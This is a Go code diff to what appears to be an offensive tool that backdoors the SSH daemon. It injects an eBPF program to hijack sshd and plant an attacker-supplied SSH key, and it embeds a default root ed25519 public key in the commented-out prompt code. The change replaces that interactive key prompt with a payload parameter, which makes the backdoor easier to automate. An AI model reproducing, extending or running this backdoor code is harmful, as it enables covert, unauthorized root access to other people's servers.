@@ -5,7 +5,6 @@ import (
 	"os/signal"
 	"syscall"
 
-	"github.com/AlecAivazis/survey/v2"
 	"github.com/cilium/ebpf"
 	"github.com/cilium/ebpf/link"
 	"github.com/cilium/ebpf/rlimit"
@@ -18,7 +17,7 @@ const (
 
 // Name of the kernel function to trace.
 
-func BackdoorSshd() (err error) {
+func BackdoorSshd(payload string) (err error) {
 	stopper := make(chan os.Signal, 1)
 	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)
 
@@ -60,7 +59,8 @@ func BackdoorSshd() (err error) {
 
 	log.Info("inject ebpf program into file system success")
 	// Send payload
-	err = SendKey(objs, ReadInputAsKey(stopper))
+	// err = SendKey(objs, ReadInputAsKey(stopper))
+	err = SendKey(objs, payload)
 	if err != nil {
 		log.Panicln(err)
 	}
@@ -69,14 +69,14 @@ func BackdoorSshd() (err error) {
 	return nil
 }
 
-func ReadInputAsKey(block chan os.Signal) (key string) {
-	_ = survey.AskOne(&survey.Input{
-		Message: "You need input a ssh key to send to hijack sshd process\n",
-		Default: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZOTdoCvyxP9XOxKvlspxRszDhgOH7xcAQGYPqKGiVM root",
-	}, &key)
-	if key == "exit" {
-		block <- os.Interrupt
-	}
-	log.Info("Your Key set is ", key)
-	return
-}
+// func ReadInputAsKey(block chan os.Signal) (key string) {
+// 	_ = survey.AskOne(&survey.Input{
+// 		Message: "You need input a ssh key to send to hijack sshd process\n",
+// 		Default: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZOTdoCvyxP9XOxKvlspxRszDhgOH7xcAQGYPqKGiVM root",
+// 	}, &key)
+// 	if key == "exit" {
+// 		block <- os.Interrupt
+// 	}
+// 	log.Info("Your Key set is ", key)
+// 	return
+// }
